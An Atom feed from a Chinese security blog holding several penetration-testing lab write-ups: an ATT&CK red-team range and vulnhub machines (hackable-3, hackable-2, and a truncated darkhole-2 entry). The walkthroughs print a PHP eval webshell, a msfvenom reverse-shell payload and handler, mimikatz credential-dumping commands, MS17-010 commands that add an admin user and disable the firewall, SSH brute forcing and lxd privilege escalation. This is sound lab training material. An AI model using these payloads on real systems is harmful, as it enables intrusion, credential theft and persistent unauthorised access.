<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Syst1m</title>
  
  
  <link href="https://syst1m.top/atom.xml" rel="self"/>
  
  <link href="https://syst1m.top/"/>
  <updated>2022-07-17T09:47:58.988Z</updated>
  <id>https://syst1m.top/</id>
  
  <author>
    <name>Syst1m</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ATT&amp;CK红队实战靶场01</title>
    <link href="https://syst1m.top/2022/07/17/ATT&amp;CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA01/"/>
    <id>https://syst1m.top/2022/07/17/ATT&amp;CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA01/</id>
    <published>2022-07-17T06:44:33.000Z</published>
    <updated>2022-07-17T09:47:58.988Z</updated>
    
    <content type="html"><![CDATA[<h1 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171447834.png"></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>三台机器，解压使用vm打开，默认密码hongrisec@2019</p><h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><p>win7增加一块网卡,设置为桥接模式,用来连通攻击机.仅主机用来连通内网的两台靶机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171452480.png"></p><h2 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h2><p>win7 net1桥接 外网192.168.31.183 net2仅主机 内网:192.168.52.143<br>win2003 net1仅主机 内网:192.168.52.141<br>win2003 net1仅主机 内网:192.168.52.138</p><h2 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h2><p>kali net1桥接 外网:192.168.31.118</p><h2 id="开启web环境"><a href="#开启web环境" class="headerlink" title="开启web环境"></a>开启web环境</h2><p>在win7启动phpstudy</p><h1 id="外网突破"><a href="#外网突破" class="headerlink" title="外网突破"></a>外网突破</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>kali扫一下网段,确认靶机ip<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171513229.png"></p><p>访问是一个php探针<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171511761.png"></p><p>接着扫一下目录,存在phpmyadmin<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171517733.png"></p><p>弱密码登录成功 root root<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171519266.png"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>尝试通过文件写马,但是–secure0file-priv被写死<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171525433.png"></p><p>继续尝试日志写马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;</span><br></pre></td></tr></table></figure><p>发现日志功能关闭,但是我们可以通过mysql命令开启,并保存修改路径存到我们指定的目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171529236.png"></p><p>开启日志并修改保存路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=on;</span><br><span class="line">set global general_log_file=&#x27;C:/phpStudy/WWW/shell.php&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171533073.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171534976.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171534585.png"></p><p>查询一句话木马,利用日志写入shell.php中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171536904.png"></p><p>蚁剑连接<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171537195.png"></p><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p><code>whoami</code>查看当前用户为管理员<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171540344.png"></p><p><code>ipconfig</code> 发现还存在一个网段<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171541043.png"></p><p><code>net config Workstation</code> 查看当前计算机名称,用户名等详细信息<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171543492.png"></p><p><code>net localgroup administrators</code> 查看其他管理员<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171543392.png"></p><p><code>systeminfo</code> 查看系统信息,发现打了4个补丁,当前域为god.org,域服务器名OWA<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171545007.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>由于win7启动了安全模式,所以无法直接反弹shell,用msf生成一个木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.118 LPORT=4444 -f exe -o msf.exe</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.31.118</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171558828.png"></p><p>提升为system权限<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171601565.png"></p><p>ps：mimikatz模块已经合并为kiwi模块</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">ls<span class="built_in">a_dump</span>_sam：dump出lsa的SAM</span><br><span class="line">ls<span class="built_in">a_dump</span>_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件/编码</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>抓取密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171613114.png"></p><h1 id="进入内网"><a href="#进入内网" class="headerlink" title="进入内网"></a>进入内网</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>查看安装的软件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_applications</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171616956.png"></p><p>查看路由,发现还存在另一个网段192.168.52.0&#x2F;24</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171618532.png"></p><p>添加路由</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24添加录路由；</span><br><span class="line">run autoroute -p查看路由；</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171621412.png"></p><p>设置代理访问内网<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171652380.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="built_in">set</span> srvhost 192.168.2.129</span><br><span class="line"><span class="built_in">set</span> srvport 1080</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>配置代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171653857.png"></p><p>测试<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171719877.png"></p><p>探测内网存活主机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171706996.png"></p><p>用nmap扫描却扫不出来<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171720554.png"></p><p>刚刚拿下的win7是存在nmap的,用它扫描.进入kali刚刚反弹的会话,蚁剑不是交互式shell看不到返回<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171727686.png"></p><h1 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h1><p>两台主机都存在445 和 135 端口,说明存在smb服务<br>尝试ms17_010,发现打不了<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171731292.png"></p><p>再次尝试ms17_010_command,成功执行命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171733335.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> net user hack 8888! /add添加用户；</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> net localgroup administrators hack /add添加管理员权限；</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> <span class="string">&#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;</span>执行命令开启3389端口，这里要么用单引号把命令引住，要么用反斜杠对反斜杠和引号进行转义，否则会出错；</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> netsh firewall <span class="built_in">set</span> opmode mode=<span class="built_in">disable</span> /关闭防火墙</span><br></pre></td></tr></table></figure><p>win2003也是一样的打法不再赘述</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;拓扑图&quot;&gt;&lt;a href=&quot;#拓扑图&quot; class=&quot;headerlink&quot; title=&quot;拓扑图&quot;&gt;&lt;/a&gt;拓扑图&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202207171447834.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;三台机器，解压使用vm打开，默认密码hongrisec@2019&lt;/p&gt;
&lt;h1 id=&quot;网络配置&quot;&gt;&lt;a href=&quot;#网络配置&quot; class=&quot;headerlink&quot; title=&quot;网络配置&quot;&gt;&lt;/a&gt;网络配置&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>hackable-3打靶</title>
    <link href="https://syst1m.top/2022/06/27/hackable-3%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/27/hackable-3%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-27T12:01:23.000Z</published>
    <updated>2022-06-28T02:41:45.513Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/entry/hackable-iii,720/">https://www.vulnhub.com/entry/hackable-iii,720/</a><br>靶机:172.16.17.156<br>攻击机kali:172.16.17.140</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描靶机,22端口filtered,80正常开发,apache<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272036738.png"></p><p>访问首页看看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272042009.png"></p><p>没有功能点,扫下目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272044678.png"></p><p>挨个访问,有两个txt文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272053867.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272054740.png"><br>一个字典<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272055221.png"></p><p>一串密文,base64解出为10000,暂时不知道什么意思,继续往下<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272057190.png"></p><p>在网页源码里看到了注释,得到提示,还有一个登录口<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272048590.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- &quot;Please, jubiscleudo, don&#x27;t forget to activate the port knocking when exiting your section, </span></span><br><span class="line"><span class="comment">and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com&quot; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- “jubiscleudo，请不要忘记在退出部门时激活端口敲门，并告诉老板不要忘记批准.jpg文件-dev_suport@hackable3.com&quot; --&gt;</span></span><br></pre></td></tr></table></figure><p>得到一个用户名和一个邮箱,结合上面的端口扫描,应该是提示需要碰撞打开22端口</p><p>访问登录口<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272100696.png"></p><p>尝试利用上面的字典爆破,无果<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272105700.png"></p><p>在登录页的源码里翻到一个地址<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272110189.png"></p><p>进一步扫描目录,.php结尾的文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272111295.png"></p><p>挨个访问,爆出了源码和数据库密码,但是数据库端口并不对外开放<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272112979.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272113138.png"></p><p>login.php中提到一个3.jpg,直接访问看看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272125744.png"></p><p>没有任何提示和利用的地方,想到隐写,把图片下载下来 进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://172.16.17.156/3.jpg ./</span><br><span class="line">steghide --extract -sf 3.jpg</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272134681.png"></p><p>得到提示,porta:65535,前面得到一个10000,应该是knock使用碰撞ssh端口,但是还差一个,继续翻前面爆破出的目录</p><p>翻到一个2.txt<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272140728.png"></p><p>熟悉的ctf加密方式<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272140818.png"></p><p>解密 <a href="http://www.hiencode.com/brain.html">http://www.hiencode.com/brain.html</a><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272142726.png"></p><p>得到三个端口号 65535 10000 4444</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="碰撞ssh打开端口"><a href="#碰撞ssh打开端口" class="headerlink" title="碰撞ssh打开端口"></a>碰撞ssh打开端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">knock 172.16.17.156 -v 10000 4444 65535</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206280958059.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206280959656.png"></p><h2 id="爆破ssh"><a href="#爆破ssh" class="headerlink" title="爆破ssh"></a>爆破ssh</h2><p>使用上面拿到的用户名和字典,爆破ssh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jubiscleudo -P wordlist.txt 172.16.17.156 ssh </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281006417.png"></p><p>登录账号,找到第一个flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281012148.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>没有sudo权限的文件,在网站目录下翻到一个隐藏文件,提示我们mysql root用户没有密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281015482.png"></p><p>尝试登录mysql发现根本没有这个服务<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281017369.png"></p><p>回到上面的隐藏文件,发现给出一个账号密码,在家目录翻的时候,恰好有一个hackable_3用户的文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">&#x27;DB_USERNAME&#x27;</span>, <span class="string">&#x27;hackable_3&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;TrOLLED_3&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281020151.png"></p><p>登录成功,但是没有任何可利用的地方<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281023340.png"></p><p>查阅其他师傅的文章,发现在lxd组中,lxd和docker一样,一种容器<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281028117.png"></p><p>利用lxd容器提权,思路是将容器的目录映射到root目录下<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281039098.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281037956.png"></p><p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">提权方法</a> 使用第二种</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># build a simple alpine image</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/saghul/lxd-alpine-builder</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">sed -i <span class="string">&#x27;s,yaml_path=&quot;latest-stable/releases/$apk_arch/latest-releases.yaml&quot;,yaml_path=&quot;v3.8/releases/$apk_arch/latest-releases.yaml&quot;,&#x27;</span> build-alpine</span><br><span class="line">sudo ./build-alpine -a i686</span><br><span class="line"></span><br><span class="line"><span class="comment"># import the image</span></span><br><span class="line">lxc image import ./alpine*.tar.gz --<span class="built_in">alias</span> myimage <span class="comment"># It&#x27;s important doing this from YOUR HOME directory on the victim machine, or it might fail.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># before running the image, start and configure the lxd storage pool as default </span></span><br><span class="line">lxd init</span><br><span class="line"></span><br><span class="line"><span class="comment"># run the image</span></span><br><span class="line">lxc init myimage mycontainer -c security.privileged=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mount the /root into the image</span></span><br><span class="line">lxc config device add mycontainer mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># interact with the container</span></span><br><span class="line">lxc start mycontainer</span><br><span class="line">lxc <span class="built_in">exec</span> mycontainer /bin/sh</span><br></pre></td></tr></table></figure><p>在&#x2F;mnt&#x2F;root&#x2F;root下拿到flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281041068.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/entry/hackable-iii,720/&quot;&gt;https://www.vulnhub.com/entry/hackable-iii,720/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.156&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;nmap扫描靶机,22端口filtered,80正常开发,apache&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206272036738.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;访问首页看看&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206272042009.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="ftp" scheme="https://syst1m.top/tags/ftp/"/>
    
  </entry>
  
  <entry>
    <title>hackable:2打靶</title>
    <link href="https://syst1m.top/2022/06/27/hackable-2%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/27/hackable-2%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-27T07:44:44.000Z</published>
    <updated>2022-06-27T12:00:56.660Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/entry/darkhole-2,740/">https://www.vulnhub.com/entry/darkhole-2,740/</a><br>靶机:172.16.17.155<br>攻击机kali:172.16.17.140</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>对靶机进行端口扫描,开放了21,22,80,存在Anonymous用户<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271926183.png"></p><p>网站就一个apache首页<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271935104.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>回到ftp使用Anonymous用户登录,密码为任意邮箱,<a href="mailto:&#49;&#50;&#51;&#x40;&#x31;&#50;&#51;&#x2e;&#x63;&#111;&#x6d;">&#49;&#50;&#51;&#x40;&#x31;&#50;&#51;&#x2e;&#x63;&#111;&#x6d;</a><br>发现存在一个html文件下载下来<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271932686.png"></p><p>打开,查看源代码,title有一串可疑字符,和一句提示<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271934487.png"></p><p>没有利用的点,回到网站,扫一下目录,扫到一个files<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271938467.png"></p><p>打开发现一个CALL.html,和ftp上的一模一样<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271939684.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271939512.png"></p><p>猜测ftp目录和web目录为同一个,利用ftp上传webshell试试<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271941357.png"></p><p>访问存在,上蚁剑<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271944032.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用蚁剑反弹一个shell到kali<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271947654.png"></p><p>翻家目录,翻到一个txt,提示我们运行一个sh脚本,运行之后出来一串密文<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271949779.png"></p><p>尝试解密onion,应该是shrek的密码,和最开始的html标题一样…<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271950204.png"></p><p>ssh登录上来<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271953098.png"></p><p>查看拥有sudo权限的文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271954027.png"></p><p>有python,直接写shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271958787.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/entry/darkhole-2,740/&quot;&gt;https://www.vulnhub.com/entry/darkhole-2,740/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.155&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;对靶机进行端口扫描,开放了21,22,80,存在Anonymous用户&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206271926183.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;网站就一个apache首页&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206271935104.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="ftp" scheme="https://syst1m.top/tags/ftp/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-darkhole:2打靶</title>
    <link href="https://syst1m.top/2022/06/25/vulnhub-darkhole-2%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/25/vulnhub-darkhole-2%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-25T12:52:23.000Z</published>
    <updated>2022-06-25T14:56:37.361Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/entry/darkhole-2,740/">https://www.vulnhub.com/entry/darkhole-2,740/</a><br>靶机:172.16.17.154<br>攻击机kali:172.16.17.140</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap 扫描靶机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252101537.png"></p><p>访问一下首页,看看web指纹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252102462.png"></p><p>首页只有一个登录功能, nmap扫到一个.git目录,继续扫一下目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252103052.png"></p><p>config和.git挨个访问,都存在目录遍历和git泄露<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252104899.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252108851.png"></p><p>信息收集到此结束</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="获取git源码"><a href="#获取git源码" class="headerlink" title="获取git源码"></a>获取git源码</h2><p>脚本地址 <a href="https://github.com/lijiejie/GitHack/">https://github.com/lijiejie/GitHack/</a></p><p>用脚本下载源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://172.16.17.154/.git/</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252140311.png"></p><p>查看一下目录结构<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252141979.png"></p><p>得到数据库账号密码,但是并未对外开放数据库端口<br><img 